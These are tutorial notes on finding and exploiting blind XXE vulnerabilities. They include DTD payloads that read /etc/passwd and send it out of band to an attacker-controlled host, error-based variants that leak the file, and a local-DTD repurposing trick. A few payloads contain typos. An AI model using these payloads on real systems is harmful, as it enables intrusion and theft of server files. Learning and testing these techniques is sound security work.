# Finding and EXploiting Blind XXE Vulnerabilities

## What is Blind XXE
- `BLIND XXE` vulnerabilities arises where the application is vulnerable to `XXE injection` but does not return the values of any defined external entities with in its responses. 
- i.e direct retrieval of the server-side files is not possible, and `blind xxe is harder than regular xxe`
- `How to exploit Blind XXE` 
	- trigger out-of-band network interaction.
	- trigger XML parsing errors in such a way that the error messages contain sensitive data.

## Detecting Blind XXE using Out-of-band (OAST)
- we need to define an external entity for triggering network interaction to our server.
```js
<!DOCTYPE root [<!ENTITY DK SYSTEM "http://data.ourdomain.com" >]>
```
and use it to valid defined entity in the data value in the `XML`

- sometimes `XXE attacks` using regular Entities are Blocked, due to some input validation by the application or some hardening of the XML parser that is being used.
- in this situation you might be able to use `XML parameter Entities` , it is special kind of Entities which can only be referenced elsewhere within the `DTD` 
- for this we only need 2 things
	1. declaration of an XML parameter entity include the `%` symbol before the entity name `` <!ENTITY % myparameter_entity "parameter value"> ``
	2. parameter Entities are referenced using the `%` character instead of usual `&` character: ``%myparameter_entity``
``Final Payload for XXE Blind using Parameter Entity payload``
```js
<!DOCTYPE root [<!ENTITY % DK SYSTEM "http://attacker.domain"> %DK; ]> 
```

## Exploit Blind XXE to Exfiltrate data out-of-band (OAST)
- detecting vulnerability via out-of-band technique is well but exploitation to exfiltrate data via this is not easy.
- This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
- **Example of malicious DTD** 
```js
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval " <!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com or we use burp collaborator/?x=%file;'> ">
%eval;
%exfiltrate
```
This `DTD` carries out the following steps
- defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd ` file.
- Defines an XML parameter entity called `eval` containing a dynamic declaration of another XML parameter entity called `exfiltrate`. 
- this exfiltrate entity will be evaluated by making HTTP request to the attacker's control web server containing the value of the `%file` entity to url query string.
- uses `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
- uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
- the attacker must host this malicious `DTD` file in to his server `http://attacker.domain/malicious.dtd`
- and finally attacker need to submit the payload to the `xxe vuln` application.
```js
<!DOCTYPE root [<!ENTITY % dk SYSTEM "http://attacker.domain/malicious.dtd"> %dk; ]>
```

## Exploiting XXE to retrieve data via error messages.
- alternative approach to exploiting `blind XXE` is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve.
- this will be effective if the application returns the resulting error message within its response.
```js
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
this DTD carries out the following
1. Defines an XML Parameter entity called `file`, containing the contents of the `/etc/passwd` file.
2. defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error` . the error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
3. Uses the eval entity which causes declaration of the error entity to be performed.
4. uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
5. for exploitation put that `malicious.dtd` file to exploit server and then request to that file using `XXE injection ` and it gives error with output of `%file` entity.
invoking malicious `external DTD` will result in an error message containing the contents of the file /etc/passwd

## Exploiting Blind XXE by repurposing a local DTD
- preceding technique works fine with external DTD but normally won't work with internal DTD, 
- what to do if in blind xxe the out-of-band intraction is blocked and we cant load from the `External DTD`  from the remote location. 
- in this situation, trigger error message containing sensitive data, due to loophole in XML language specification. 
- if document's DTD uses `hybrid` of internal and external DTD declaration, then the internal DTD can reduce entities that are declared in the external DTD. 
- when this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.
- [full-explain-this attack](https://portswigger.net/web-security/xxe/blind)
**Example** if DTD file on the server at location /usr/local/app/schema.dtd, and it defines entity called `custom_entity `, an attacker can trigger an XML parsing error message containing contents of /etc/passwd by submitting `Hybrid DTD`
```js
<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY $ custom_entity '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27; file:///invalid/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'>
%local_dtd;
]>
```

## locating an Existing DTD file to repurpose.
- since this XXE attack involves repurposing an `existing DTD` on the server filesystem.
- a key requirement is to locate a suitable file. it is quite easy since server throws an error message thrown by the XML parser.
- example: in linux DTS file at `/usr/share/yelp/dtd/docbookx.dtd`

```js
<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"
%local_dtd;]>
```


